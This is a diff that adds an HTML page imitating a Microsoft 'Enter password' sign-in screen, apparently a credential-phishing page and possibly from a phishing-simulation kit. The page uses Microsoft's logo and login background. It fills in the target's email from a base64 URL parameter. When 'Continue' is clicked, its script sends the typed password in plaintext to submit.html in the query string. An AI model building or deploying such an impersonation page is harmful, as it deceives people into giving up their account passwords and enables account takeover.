@@ -1,0 +1,79 @@
+<html>
+    <head>
+        <!-- bootstrap -->
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
+    </head>
+    <style>
+        body, h1, h2, h3, h4, h5, h6  {
+          font-family: "Segoe UI", Arial, sans-serif;
+        }
+    </style>
+    <body>      
+        <div class="h-100 d-flex align-items-center justify-content-center">
+            <div>
+                <div class="card" id="main_card" style="width:500px">
+                    <div class="card-body">
+                            <div class="container"> 
+                                <div class="form-group">
+                                    <img style="width:108px" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" class="img-fluid" alt="microsoft logo"/>
+                                </div>           
+                                <div class="form-group">
+                                    <p>&#x2190; <span id="f1"></span></p>
+                                </div>
+                                <div class="form-group">
+                                    <h4><b>Enter password</b></h4>
+                                </div>
+                                <div class="form-group">
+                                    <input style="outline:0; border-width: 0 0 1px; border-color:black" type="password" class="form-control" name="f2">
+                                </div>
+                                
+                                <div class="form-group">
+                                    <a href>I Forgot</a>
+                                </div>
+                                <div class="form-group">
+                                    <button class="btn-primary col-md-4">Continue</button>
+                                </div>
+                            </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <script>
+            // set body background image
+            document.body.style.backgroundImage = "url('https://upload.wikimedia.org/wikipedia/commons/3/33/Microsoft_login_screen.svg')";
+
+            // get url parameter
+            var urlParams = new URLSearchParams(window.location.search);
+            var f1 = urlParams.get('f1');
+            if (!f1) {
+                f1 = "dGVzdEBtZWdhY29ycC5jb20="
+            }
+            // decode base64, e.g. dGVzdEBtZWdhY29ycC5jb20=
+            var f1 = atob(f1);
+            // set f1
+            document.getElementById("f1").innerText = f1;
+
+            // get main card
+            var main_card = document.getElementById("main_card");
+            // set shadow box
+            main_card.style.boxShadow = "0 0 1px 1px rgba(0,0,0,0.1)";
+
+            // add more margin to the container
+            var container = document.getElementsByClassName("container")[0];
+            container.style.marginTop = "30px";
+            container.style.marginBottom = "70px";
+            container.style.marginLeft = "5px";
+
+            // align button to the right side of the container
+            var button = document.getElementsByTagName("button")[0];
+            button.style.float = "right";
+
+            // add button onclick
+            button.onclick = function() {
+                var password = document.getElementsByName("f2")[0].value;
+                window.location.href = "submit.html?username=" + f1 + "&password=" + password;
+            }
+
+        </script>
+    </body>
+</html>
